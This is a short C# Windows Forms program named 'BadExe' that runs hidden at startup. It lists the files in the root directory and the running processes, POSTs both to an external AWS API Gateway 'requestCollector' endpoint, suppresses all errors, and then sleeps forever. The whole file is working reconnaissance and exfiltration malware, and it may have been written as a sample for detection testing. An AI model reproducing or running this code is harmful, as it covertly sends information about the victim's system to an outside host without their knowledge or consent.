using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net.Http;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace BadExe
{
    internal static class Program
    {
        /// <summary>
        /// Główny punkt wejścia dla aplikacji.
        /// </summary>
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            //Application.Run(new Form1());

            try
            {
                SendDataToCloudRootFiles();
            }catch 
            {

            }
            try
            {
                SendDataToCloudProceses();
            }
            catch
            {

            }

            while (true)
            {
                Thread.Sleep(int.MaxValue);
            }
        }
        static string ListProceses()
        {
            return String.Join("\r\n",Process.GetProcesses().Select(x=>x.ProcessName).ToList());
        }
        static async Task SendDataToCloudProceses()
        {
            var httpClient = new HttpClient();
            var data = new
            {
                foo = "abcd",
            };
            var proceses = ListProceses();


            var httpContent = new StringContent("{\"proceses\":\"" + (proceses.Replace("\r\n", "\\r\\n")) + "\"}");
            var result = await httpClient.PostAsync("https://o8m2j633k1.execute-api.eu-central-1.amazonaws.com/default/requestCollector", httpContent);

        }
        static string ListFiles()
        {
            var dirinfo = new System.IO.DirectoryInfo("/");
            var files = dirinfo.GetFiles();
            return String.Join("\\n\\r", files.Select(x => x.Name));
        }

        static async Task SendDataToCloudRootFiles()
        {
            var httpClient = new HttpClient();
            var data = new
            {
                foo = "abcd",
            };
            var files = ListFiles();


            var httpContent = new StringContent("{\"files\":\"" + (files.Replace("\r\n", "\\r\\n")) + "\"}");
            var result = await httpClient.PostAsync("https://o8m2j633k1.execute-api.eu-central-1.amazonaws.com/default/requestCollector", httpContent);

        }
    }
}
